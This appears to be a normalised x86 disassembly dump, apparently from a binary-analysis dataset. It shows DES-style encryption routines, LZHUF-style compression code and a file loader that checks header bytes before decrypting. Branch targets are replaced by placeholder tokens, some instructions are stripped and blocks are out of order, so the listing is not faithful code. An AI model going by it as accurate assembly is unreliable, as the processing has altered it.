mov [ eax + 0x8 ] ebp
mov ebp [ ecx + 0xc ]
mov [ eax + 0xc ] ebp
mov ebp [ ecx + 0x10 ]
mov [ eax + 0x10 ] ebp
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] esi
mov esi [ ecx + 0x14 ]
mov [ ecx + 0xc ] edi
mov [ ecx + 0x10 ] ebx
mov edx [ eax + 0x14 ]
mov [ eax + 0x14 ] esi
mov esi [ ecx + 0x18 ]
mov [ ecx + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ eax + 0x18 ] esi
mov [ ecx + 0x18 ] edx
sub ecx 0x1c
sub eax 0x1c
cmp eax ecx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
sub_40b760
push ebx
push ebp
mov ebx eax
push esi
mov esi ecx
mov ecx edi
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
lea ecx [ eax * 8 ]
sub ecx eax
lea ebp [ ebx + ecx * 4 ]
cmp esi edi
je r-xdata
pop esi
mov eax ebp
pop ebp
pop ebx
retn
sub ebx esi
push 0xffffffff
push 0x0
push esi
lea ecx [ ebx + esi ]
call sub_408b10
add esi 0x1c
cmp esi edi
jne r-xdata
sub_40b7b0
push ecx
mov ecx [ esp + 0xc ]
mov [ esp ] 0x0
mov eax [ esp ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
call sub_40b3c0
add esp 0x14
retn 0x8
sub_40b7e0
push 0xffffffff
push sub_4210f0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x24 ]
cmp eax edx
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
mov esi [ edx ]
mov ecx [ eax ]
mov [ eax ] esi
mov [ edx ] ecx
mov esi [ eax ]
cmp esi ecx
je r-xdata
lea ecx [ edx + 0xc ]
lea esi [ eax + 0xc ]
cmp esi ecx
je r-xdata
mov ebx [ ecx ]
mov edi [ esi ]
mov [ esi ] ebx
mov [ ecx ] edi
lea ecx [ edx + 0x10 ]
lea esi [ eax + 0x10 ]
cmp esi ecx
je r-xdata
mov ebx [ ecx ]
mov edi [ esi ]
mov [ esi ] ebx
mov [ ecx ] edi
lea ecx [ edx + 0x14 ]
add eax 0x14
cmp eax ecx
je r-xdata
mov ebx [ ecx ]
mov edi [ esi ]
mov [ esi ] ebx
mov [ ecx ] edi
mov esi [ ecx ]
mov edx [ eax ]
mov [ eax ] esi
mov [ ecx ] edx
sub_40b870
push ebp
mov ebp [ esp + 0x8 ]
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
xor al al
pop ebp
retn 0x8
test ebp ebp
je r-xdata
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
add ecx 0x7
and ecx 0xfffffff8
mov [ esp + 0x10 ] ecx
je r-xdata
push ebx
push eax
mov ebx edx
mov eax edi
call sub_40b940
cmp [ edi + 0x600 ] 0x0
jne r-xdata
mov ebx [ esp + 0x14 ]
sar ebx 0x3
test ebx ebx
jle r-xdata
mov eax [ esp + 0x14 ]
sar eax 0x3
test eax eax
jle r-xdata
pop ebx
pop esi
mov al 0x1
pop ebp
retn 0x8
push 0x1
push esi
push edi
mov eax edi
mov ecx ebp
call sub_40b9b0
push 0x0
push esi
push edi
lea eax [ edi + 0x300 ]
mov ecx esi
call sub_40b9b0
push 0x1
push esi
push edi
mov eax edi
mov ecx esi
call sub_40b9b0
add esi 0x8
add ebp 0x8
sub ebx 0x1
jne r-xdata
mov ebx eax
push 0x1
push esi
push edi
mov eax edi
mov ecx ebp
call sub_40b9b0
add esi 0x8
add ebp 0x8
sub ebx 0x1
jne r-xdata
pop ebx
pop esi
mov al 0x1
pop ebp
retn 0x8
sub_40b940
push esi
push edi
mov edi eax
xor eax eax
cmp ebx 0x10
lea esi [ edi + 0x701 ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov eax 0x10
jg r-xdata
push eax
mov eax [ esp + 0x10 ]
push eax
push esi
call sub_4158c0
add esp 0xc
push edi
mov eax esi
call sub_40bc10
cmp ebx 0x8
jle r-xdata
mov eax ebx
xor al al
mov [ edi + 0x600 ] al
pop edi
pop esi
retn 0x4
lea ecx [ edi + 0x300 ]
lea eax [ edi + 0x709 ]
push ecx
call sub_40bc10
mov al 0x1
mov [ edi + 0x600 ] al
pop edi
pop esi
retn 0x4
sub_40b9b0
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
lea ecx [ ecx ]
mov edx eax
sar edx 0x3
mov dl [ edx + esi ]
mov cl al
and cl 0x7
sar dl cl
inc eax
and dl 0x1
cmp eax 0x40
mov [ eax + rw-data ] dl
jl r-xdata
xor eax eax
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x601 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x602 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x603 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x604 ] dl
add eax 0x4
cmp eax 0x40
jl r-xdata
push ebx
lea eax [ ebp + 0x601 ]
push 0x40
push eax
push rw-data
mov [ esp + 0x20 ] eax
call sub_4158c0
add esp 0xc
cmp [ esp + 0x1c ] 0x0
jne r-xdata
mov [ esp + 0x1c ] 0xf
lea ebx [ edi + 0x2d0 ]
lea ebx [ ebx ]
mov ebx edi
mov [ esp + 0x1c ] 0x10
lea esp [ esp ]
movzx ecx [ eax + rw-data ]
movzx edx [ eax + rw-data ]
xor [ eax + rw-data ] cl
xor [ eax + rw-data ] dl
movzx ecx [ eax + rw-data ]
movzx edx [ eax + rw-data ]
xor [ eax + rw-data ] cl
xor [ eax + rw-data ] dl
add eax 0x4
cmp eax 0x20
jl r-xdata
mov eax [ esp + 0x1c ]
dec eax
mov ecx 0x8
mov esi rw-data
mov edi rw-data
sub ebx 0x30
[ edi ] [ esi ]
mov [ esp + 0x1c ] eax
test eax eax
jge r-xdata
movzx ecx [ eax + rw-data ]
movzx edx [ eax + rw-data ]
xor [ eax + rw-data ] cl
xor [ eax + rw-data ] dl
movzx ecx [ eax + rw-data ]
movzx edx [ eax + rw-data ]
xor [ eax + rw-data ] cl
xor [ eax + rw-data ] dl
add eax 0x4
cmp eax 0x20
jl r-xdata
mov ecx 0x8
mov esi rw-data
mov edi rw-data
add ebx 0x30
sub [ esp + 0x1c ] 0x1
[ edi ] [ esi ]
jne r-xdata
mov ecx 0x8
mov esi rw-data
mov edi rw-data
[ edi ] [ esi ]
mov edi rw-data
mov esi ebp
call sub_40be00
xor eax eax
nop
xor eax eax
pop ebx
mov ecx 0x8
mov esi rw-data
mov edi rw-data
[ edi ] [ esi ]
mov edi rw-data
mov esi ebp
call sub_40be00
xor eax eax
nop
jmp r-xdata
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x601 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x602 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x603 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ eax + ebp + 0x604 ] dl
add eax 0x4
cmp eax 0x40
jl r-xdata
mov eax [ esp + 0x10 ]
push 0x40
push eax
push rw-data
call sub_4158c0
mov esi [ esp + 0x20 ]
add esp 0xc
mov edx rw-data
call sub_40bff0
pop edi
pop esi
pop ebp
retn 0xc
sub_40bc10
push ebx
push ebp
push esi
mov esi eax
xor eax eax
mov edx eax
sar edx 0x3
mov dl [ edx + esi ]
mov cl al
and cl 0x7
sar dl cl
inc eax
and dl 0x1
cmp eax 0x40
mov [ eax + rw-data ] dl
jl r-xdata
xor eax eax
jmp r-xdata
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x601 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x602 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x603 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x604 ] dl
add eax 0x4
cmp eax 0x38
jl r-xdata
push 0x38
lea ebx [ edi + 0x601 ]
push ebx
push rw-data
call sub_4158c0
mov eax [ esp + 0x1c ]
add esp 0xc
xor ebp ebp
mov [ esp + 0x10 ] eax
lea esp [ esp ]
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x601 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x602 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x603 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x604 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x605 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + rw-data ]
mov [ edi + eax + 0x606 ] dl
add eax 0x6
cmp eax 0x30
jl r-xdata
mov esi [ esp + 0x10 ]
push 0x30
push ebx
push esi
call sub_4158c0
inc ebp
add esi 0x30
add esp 0xc
cmp ebp 0x10
mov [ esp + 0x10 ] esi
jl r-xdata
movsx esi [ ebp + r--data ]
push esi
push rw-data
push ebx
call sub_4158c0
mov ecx 0x1c
sub ecx esi
push ecx
lea edx [ esi + rw-data ]
push edx
push rw-data
call sub_4158c0
push esi
mov eax rw-data
sub eax esi
push ebx
push eax
call sub_4158c0
movsx esi [ ebp + r--data ]
push esi
push rw-data
push ebx
call sub_4158c0
mov ecx 0x1c
sub ecx esi
push ecx
lea edx [ esi + rw-data ]
push edx
push rw-data
call sub_4158c0
push esi
mov eax rw-data
sub eax esi
push ebx
push eax
call sub_4158c0
add esp 0x48
xor eax eax
jmp r-xdata
pop esi
pop ebp
pop ebx
retn 0x4
sub_40be00
push ecx
xor eax eax
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x601 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x602 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x603 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x604 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x605 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x606 ] dl
add eax 0x6
cmp eax 0x30
jl r-xdata
push ebp
lea eax [ esi + 0x601 ]
push 0x30
push eax
push rw-data
mov [ esp + 0x10 ] eax
call sub_4158c0
mov ebp ebx
add esp 0xc
xor eax eax
sub ebp rw-data
movzx ecx [ eax + ebp + rw-data ]
xor [ eax + rw-data ] cl
movzx edx [ ebx + eax + 0x1 ]
xor [ eax + rw-data ] dl
movzx ecx [ ebx + eax + 0x2 ]
xor [ eax + rw-data ] cl
movzx edx [ ebx + eax + 0x3 ]
xor [ eax + rw-data ] dl
movzx ecx [ ebx + eax + 0x4 ]
xor [ eax + rw-data ] cl
movzx edx [ ebx + eax + 0x5 ]
xor [ eax + rw-data ] dl
add eax 0x6
cmp eax 0x30
jl r-xdata
mov eax edi
call sub_40bf70
xor eax eax
pop ebp
lea esp [ esp ]
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x601 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x602 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x603 ] dl
movsx ecx [ eax + r--data ]
movzx edx [ ecx + edi - 0x1 ]
mov [ esi + eax + 0x604 ] dl
add eax 0x4
cmp eax 0x20
jl r-xdata
mov eax [ esp ]
push 0x20
push eax
push edi
call sub_4158c0
add esp 0x10
retn
sub_40bf70
push ebp
push esi
push edi
xor edi edi
mov esi eax
mov ecx rw-data
lea ebp [ edi + 0x8 ]
nop
mov al [ ecx ]
mov dl [ ecx - 0x1 ]
add al al
add al [ ecx + 0x1 ]
add dl dl
add dl [ ecx + 0x4 ]
add al al
add al [ ecx + 0x2 ]
movsx edx dl
add al al
add al [ ecx + 0x3 ]
add edx edi
shl edx 0x4
movsx eax al
lea eax [ edx + eax + r--data ]
movzx edx [ eax ]
and dl 0x1
mov [ esi ] dl
movzx edx [ eax ]
sar dl 0x1
and dl 0x1
mov [ esi + 0x1 ] dl
movzx edx [ eax ]
sar dl 0x2
and dl 0x1
mov [ esi + 0x2 ] dl
movzx eax [ eax ]
sar al 0x3
and al 0x1
mov [ esi + 0x3 ] al
add edi 0x4
add ecx 0x6
add esi 0x4
sub ebp 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_40bff0
push ebx
xor eax eax
push ebp
mov [ esi ] eax
push edi
mov [ esi + 0x4 ] eax
lea edi [ edx + 0x3 ]
mov eax 0x1
lea ecx [ eax - 0x1 ]
mov ebx ecx
sar ebx 0x3
lea ebp [ ebx + esi ]
movzx ebx [ eax + edx - 0x1 ]
and ecx 0x7
shl bl cl
mov ecx eax
sar ecx 0x3
add edi 0x4
or [ ebp ] bl
movzx ebx [ eax + edx ]
lea ebp [ ecx + esi ]
mov ecx eax
and ecx 0x7
shl bl cl
lea ecx [ eax + 0x1 ]
or [ ebp ] bl
mov ebx ecx
sar ebx 0x3
lea ebp [ ebx + esi ]
movzx ebx [ edi - 0x5 ]
and ecx 0x7
shl bl cl
lea ecx [ eax + 0x2 ]
add eax 0x4
or [ ebp ] bl
mov ebx ecx
sar ebx 0x3
lea ebp [ ebx + esi ]
movzx ebx [ edi - 0x4 ]
and ecx 0x7
shl bl cl
lea ecx [ eax - 0x1 ]
or [ ebp ] bl
cmp ecx 0x40
jl r-xdata
pop edi
pop ebp
pop ebx
retn
sub_40c070
sub esp 0x768
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x764 ] eax
mov eax [ esp + 0x76c ]
push ebp
mov ebp [ esp + 0x774 ]
push esi
push r--data
push eax
call sub_40eeee
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov ecx [ esp + 0x76c ]
pop esi
pop ebp
xor ecx esp
call sub_40e1e0
add esp 0x768
retn 0x8
push edi
push esi
call sub_40fd92
push 0x2
push 0x0
push esi
call sub_40f7fc
push esi
call sub_40f704
push 0x0
push 0x0
push esi
mov edi eax
call sub_40f7fc
add esp 0x20
push esi
call sub_40e590
add esp 0x4
test eax eax
je r-xdata
mov dl [ esp + 0x729 ]
cmp dl [ rw-data ]
jne r-xdata
push esi
push 0x8
lea eax [ esp + 0x730 ]
push 0x1
push eax
call sub_40f2aa
mov cl [ esp + 0x738 ]
add esp 0x10
cmp cl [ rw-data ]
jne r-xdata
push esi
call sub_40fc45
add esp 0x4
xor eax eax
mov al [ esp + 0x72a ]
cmp al [ rw-data ]
jne r-xdata
mov cl [ esp + 0x72b ]
cmp cl [ rw-data ]
jne r-xdata
mov dl [ esp + 0x72c ]
cmp dl [ rw-data ]
jne r-xdata
mov al [ esp + 0x72d ]
cmp al [ rw-data ]
jne r-xdata
mov cl [ esp + 0x72e ]
cmp cl [ rw-data ]
jne r-xdata
mov dl [ esp + 0x72f ]
cmp dl [ rw-data ]
je r-xdata
push esi
push 0x1
lea eax [ esp + 0x18 ]
push 0x4
push eax
call sub_40f2aa
push esi
call sub_40f704
mov ecx [ esp + 0x24 ]
add esp 0x14
cmp ecx 0x40
jae r-xdata
add eax ecx
cmp eax edi
jae r-xdata
push esi
push 0x1
push ecx
lea ecx [ esp + 0x73c ]
push ecx
call sub_40f2aa
push esi
push 0x1
lea edx [ esp + 0x24 ]
push 0x4
push edx
call sub_40f2aa
push esi
call sub_40f704
mov ecx [ esp + 0x30 ]
add eax ecx
add esp 0x24
cmp eax edi
jae r-xdata
cmp ecx 0x1000
ja r-xdata
push ebx
push ecx
call sub_40fd2d
mov ecx [ esp + 0x14 ]
push esi
push 0x1
mov ebx eax
push ecx
push ebx
call sub_40f2aa
mov edx [ esp + 0x24 ]
add esp 0x14
push edx
mov edx [ esp + 0x18 ]
push ebx
lea eax [ esp + 0x73c ]
mov ecx ebp
lea edi [ esp + 0x20 ]
call sub_40b870
push ebx
call sub_40f2fb
push esi
call sub_40fc45
add esp 0x8
mov eax 0x1
pop ebx
jmp r-xdata
pop edi
sub_40c250
sub esp 0x8
push ebx
push ebp
mov ebp [ esp + 0x14 ]
movsx ebx bp
lea ecx [ ebx + eax + 0x8 ]
mov [ esp + 0xc ] ecx
movzx cx [ ecx ]
push esi
mov esi 0x1001
add cx si
movzx esi cx
mov ecx 0x1000
mov [ eax + ebx * 2 + 0x1048 ] cx
mov [ eax + ebx * 2 + 0x304a ] cx
xor ecx ecx
push edi
mov edx 0x1
mov [ esp + 0x10 ] ebx
mov [ eax + 0x1046 ] cx
jmp r-xdata
test dx dx
jl r-xdata
movsx ecx si
movzx ecx [ eax + ecx * 2 + 0x1048 ]
mov edx 0x1000
cmp cx dx
je r-xdata
movsx edx si
movzx ecx [ eax + edx * 2 + 0x304a ]
mov edx 0x1000
cmp cx dx
jne r-xdata
movsx ecx si
pop edi
mov [ eax + ecx * 2 + 0x1048 ] bp
mov [ eax + ebx * 2 + 0x524c ] si
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
movzx esi cx
mov ecx 0x1
movsx edi si
lea ecx [ ecx ]
movsx ecx si
pop edi
mov [ eax + ecx * 2 + 0x304a ] bp
mov [ eax + ebx * 2 + 0x524c ] si
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
cmp cx 0x2
mov ebp [ esp + 0x1c ]
jle r-xdata
inc ecx
cmp cx 0x3c
jl r-xdata
mov ebx [ esp + 0x10 ]
cmp cx [ eax + 0x1046 ]
jle r-xdata
mov ebp [ esp + 0x14 ]
movsx edx cx
lea ebx [ edx + edi ]
movzx dx [ edx + ebp ]
movzx bx [ ebx + eax + 0x8 ]
sub dx bx
movzx edx dx
test dx dx
jne r-xdata
jne r-xdata
mov ebx ebp
sub ebx esi
and ebx 0xfff
dec ebx
cmp cx 0x3c
mov [ eax + 0x1044 ] bx
mov [ eax + 0x1046 ] cx
jge r-xdata
mov ebx [ esp + 0x10 ]
mov ecx ebx
sub ecx edi
movzx edi [ eax + 0x1044 ]
and ecx 0xfff
dec ecx
cmp ecx edi
jae r-xdata
mov edx [ esp + 0x10 ]
movsx ecx si
movzx edi [ eax + ecx * 2 + 0x524c ]
mov [ eax + edx * 2 + 0x524c ] di
movzx edi [ eax + ecx * 2 + 0x1048 ]
mov [ eax + edx * 2 + 0x1048 ] di
movzx edi [ eax + ecx * 2 + 0x304a ]
mov [ eax + edx * 2 + 0x304a ] di
movsx edx [ eax + ecx * 2 + 0x1048 ]
mov [ eax + edx * 2 + 0x524c ] bp
movsx edx [ eax + ecx * 2 + 0x304a ]
mov [ eax + edx * 2 + 0x524c ] bp
movsx edx [ eax + ecx * 2 + 0x524c ]
cmp [ eax + edx * 2 + 0x304a ] si
jne r-xdata
cmp cx cx
mov [ eax + 0x1044 ] cx
jmp r-xdata
pop edi
mov [ eax + edx * 2 + 0x1048 ] bp
pop esi
mov edx 0x1000
pop ebp
mov [ eax + ecx * 2 + 0x524c ] dx
pop ebx
add esp 0x8
retn 0x4
pop edi
mov [ eax + edx * 2 + 0x304a ] bp
pop esi
mov edx 0x1000
pop ebp
mov [ eax + ecx * 2 + 0x524c ] dx
pop ebx
add esp 0x8
retn 0x4
sub_40c460
push esi
movsx esi bx
mov ecx 0x1000
cmp [ eax + esi * 2 + 0x524c ] cx
je r-xdata
pop esi
retn
movzx edx [ eax + esi * 2 + 0x304a ]
cmp dx cx
movzx ecx [ eax + esi * 2 + 0x1048 ]
push edi
je r-xdata
mov di [ eax + esi * 2 + 0x524c ]
movsx edx cx
mov [ eax + edx * 2 + 0x524c ] di
movsx edx [ eax + esi * 2 + 0x524c ]
pop edi
cmp [ eax + edx * 2 + 0x304a ] bx
jne r-xdata
mov edi 0x1000
cmp cx di
jne r-xdata
mov [ eax + edx * 2 + 0x1048 ] cx
mov ecx 0x1000
mov [ eax + esi * 2 + 0x524c ] cx
mov [ eax + edx * 2 + 0x304a ] cx
mov ecx 0x1000
mov [ eax + esi * 2 + 0x524c ] cx
pop esi
retn
movzx ecx cx
movsx edx cx
push ebp
lea edi [ eax + edx * 2 + 0x304a ]
mov ebp 0x1000
cmp [ edi ] bp
je r-xdata
movzx ecx dx
jmp r-xdata
mov di [ eax + esi * 2 + 0x304a ]
mov [ eax + edx * 2 + 0x304a ] di
movsx edx [ eax + esi * 2 + 0x304a ]
mov [ eax + edx * 2 + 0x524c ] cx
pop ebp
jmp r-xdata
movzx ecx [ edi ]
movsx edx cx
lea edi [ eax + edx * 2 + 0x304a ]
mov edx ebp
cmp [ edi ] dx
jne r-xdata
movsx edx cx
movsx edi [ eax + edx * 2 + 0x524c ]
mov bp [ eax + edx * 2 + 0x1048 ]
mov [ eax + edi * 2 + 0x304a ] bp
movsx edi [ eax + edx * 2 + 0x1048 ]
mov bp [ eax + edx * 2 + 0x524c ]
mov [ eax + edi * 2 + 0x524c ] bp
mov di [ eax + esi * 2 + 0x1048 ]
mov [ eax + edx * 2 + 0x1048 ] di
movsx edi [ eax + esi * 2 + 0x1048 ]
mov [ eax + edi * 2 + 0x524c ] cx
sub_40c5a0
sub esp 0x8
cmp [ esi + 0x8378 ] 0x8
ja r-xdata
movzx eax [ esi + 0x8376 ]
dec [ esi + 0x8378 ]
movzx ecx ax
lea edx [ eax + eax ]
movzx eax cx
mov [ esi + 0x8376 ] dx
shr eax 0xf
add esp 0x8
retn
push ebx
push ebp
push edi
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0x83a8 ]
mov [ esp + 0xc ] ebx
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0x8384 ]
push ebx
lea eax [ esp + 0x14 ]
push eax
push 0x1
lea ecx [ esp + 0x18 ]
push ecx
push edx
mov [ esp + 0x24 ] ebx
call [ ReadFile@IAT ]
mov ebp [ esp + 0x10 ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov edi [ esi + 0x83a0 ]
mov ebp eax
mov eax [ esi + 0x8394 ]
lea ecx [ edi + 0x1 ]
cmp ecx eax
jle r-xdata
cmp ebp 0x1
je r-xdata
mov ecx 0xffff
movzx edx ax
cmp ax cx
jne r-xdata
mov edx [ esi + 0x838c ]
push ebp
add edx edi
push edx
lea eax [ esp + 0x14 ]
push eax
call sub_4158c0
add esp 0xc
add edi ebp
mov [ esi + 0x83a0 ] edi
sub eax edi
mov ebp eax
mov eax [ esp + 0xc ]
mov al [ esi + 0x8378 ]
movzx edi al
mov ecx 0x8
sub ecx edi
shl edx cl
add al 0x8
mov [ esi + 0x8378 ] al
or [ esi + 0x8376 ] dx
cmp al 0x8
jbe r-xdata
xor edx edx
pop edi
pop ebp
pop ebx
sub_40c6a0
sub esp 0x8
cmp [ esi + 0x8378 ] 0x8
ja r-xdata
movzx eax [ esi + 0x8376 ]
add [ esi + 0x8378 ] 0xf8
movzx ecx ax
shl eax 0x8
mov [ esi + 0x8376 ] ax
movzx eax cx
shr eax 0x8
add esp 0x8
retn
push ebx
push ebp
push edi
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0x83a8 ]
mov [ esp + 0xc ] ebx
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0x8384 ]
push ebx
lea eax [ esp + 0x14 ]
push eax
push 0x1
lea ecx [ esp + 0x18 ]
push ecx
push edx
mov [ esp + 0x24 ] ebx
call [ ReadFile@IAT ]
mov ebp [ esp + 0x10 ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov edi [ esi + 0x83a0 ]
mov ebp eax
mov eax [ esi + 0x8394 ]
lea ecx [ edi + 0x1 ]
cmp ecx eax
jle r-xdata
cmp ebp 0x1
je r-xdata
mov ecx 0xffff
movzx edx ax
cmp ax cx
jne r-xdata
mov edx [ esi + 0x838c ]
push ebp
add edx edi
push edx
lea eax [ esp + 0x14 ]
push eax
call sub_4158c0
add esp 0xc
add edi ebp
mov [ esi + 0x83a0 ] edi
sub eax edi
mov ebp eax
mov eax [ esp + 0xc ]
mov al [ esi + 0x8378 ]
movzx edi al
mov ecx 0x8
sub ecx edi
shl edx cl
add al 0x8
mov [ esi + 0x8378 ] al
or [ esi + 0x8376 ] dx
cmp al 0x8
jbe r-xdata
xor edx edx
pop edi
pop ebp
pop ebx
sub_40c7a0
push edi
mov edi eax
mov al [ esi + 0x837c ]
mov cl al
mov edx edi
shr dx cl
add al bl
mov [ esi + 0x837c ] al
or [ esi + 0x837a ] dx
cmp al 0x8
jb r-xdata
pop edi
retn
movzx eax [ esi + 0x837b ]
push eax
mov eax esi
call sub_40d670
cmp eax 0xffffffff
je r-xdata
add [ esi + 0x837c ] 0xf8
cmp [ esi + 0x837c ] 0x8
jb r-xdata
shl [ esi + 0x837a ] 0x8
inc [ esi + 0x4 ]
movzx ecx [ esi + 0x837a ]
push ecx
mov eax esi
call sub_40d670
cmp eax 0xffffffff
je r-xdata
add [ esi + 0x837c ] 0xf8
movzx edx [ esi + 0x837c ]
add [ esi + 0x4 ] 0x2
mov ecx ebx
sub ecx edx
shl edi cl
mov [ esi + 0x837a ] di
pop edi
retn
sub_40c830
push ebx
push esi
xor eax eax
lea ecx [ edx + 0x7e90 ]
push edi
jmp r-xdata
mov esi 0x1
mov [ ecx - 0xc42 ] si
lea esi [ eax + 0x273 ]
mov [ ecx ] si
mov [ ecx - 0x274 ] ax
inc eax
mov esi 0x13a
add ecx 0x2
cmp ax si
jl r-xdata
xor esi esi
mov ecx 0x13a
lea edi [ edx + 0x8104 ]
jmp r-xdata
movsx eax si
mov bx [ edx + eax * 2 + 0x7250 ]
add bx [ edx + eax * 2 + 0x724e ]
mov [ edi ] si
mov [ edi - 0xc42 ] bx
mov [ edx + eax * 2 + 0x7738 ] cx
mov [ edx + eax * 2 + 0x7736 ] cx
inc ecx
mov eax 0x272
add esi 0x2
add edi 0x2
cmp cx ax
jle r-xdata
pop edi
mov ecx 0xffff
xor eax eax
pop esi
mov [ edx + 0x7734 ] cx
mov [ edx + 0x7c1a ] ax
pop ebx
retn
sub_40c8e0
sub esp 0x8
push ebx
push ebp
push edi
xor ebx ebx
lea ecx [ esi + 0x7e90 ]
mov ebp 0x273
add ecx 0x2
sub ebp 0x1
jne r-xdata
movzx eax [ ecx - 0xc42 ]
inc eax
cdq
movsx edi bx
sub eax edx
sar eax 0x1
mov [ esi + edi * 2 + 0x724e ] ax
mov dx [ ecx ]
mov [ esi + edi * 2 + 0x7e90 ] dx
inc ebx
mov eax 0x273
cmp [ ecx ] ax
jl r-xdata
xor eax eax
mov [ esp + 0xc ] eax
mov ebx 0x13a
jmp r-xdata
lea ecx [ eax + 0x1 ]
movsx edx cx
movsx ecx ax
mov ax [ esi + edx * 2 + 0x724e ]
add ax [ esi + ecx * 2 + 0x724e ]
movsx edx bx
mov [ esi + edx * 2 + 0x724e ] ax
movzx edx ax
lea ecx [ ebx - 0x1 ]
movzx eax cx
movsx ecx cx
mov [ esp + 0x10 ] edx
cmp dx [ esi + ecx * 2 + 0x724e ]
jae r-xdata
inc eax
mov edx ebx
sub edx eax
add edx edx
movzx ecx dx
movsx edi ax
movzx ebp cx
lea eax [ esi + edi * 2 + 0x724e ]
push ebp
push eax
lea eax [ esi + edi * 2 + 0x7250 ]
push eax
call sub_40fdd0
mov cx [ esp + 0x1c ]
lea eax [ esi + edi * 2 + 0x7e90 ]
push ebp
push eax
lea edx [ esi + edi * 2 + 0x7e92 ]
push edx
mov [ esi + edi * 2 + 0x724e ] cx
mov [ esp + 0x28 ] eax
call sub_40fdd0
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ ecx ] ax
add eax 0x2
inc ebx
mov edx 0x273
add esp 0x18
cmp bx dx
mov [ esp + 0xc ] eax
jl r-xdata
jmp r-xdata
mov eax [ esp + 0xc ]
xor eax eax
lea edx [ esi + 0x7e90 ]
jmp r-xdata
dec eax
movsx ecx ax
cmp dx [ esi + ecx * 2 + 0x724e ]
jb r-xdata
movzx ecx [ edx ]
mov edi 0x273
cmp cx di
movsx ecx cx
mov [ esi + ecx * 2 + 0x7736 ] ax
jge r-xdata
inc eax
mov ecx edi
add edx 0x2
cmp ax cx
jl r-xdata
mov [ esi + ecx * 2 + 0x7738 ] ax
pop edi
pop ebp
pop ebx
add esp 0x8
retn
sub_40ca50
push ebx
push ebp
push esi
mov esi eax
mov eax 0x8000
push edi
cmp [ esi + 0x7732 ] ax
jne r-xdata
movsx ecx [ esp + 0x14 ]
movzx ebx [ esi + ecx * 2 + 0x7c1c ]
jmp r-xdata
call sub_40c8e0
movsx ecx bx
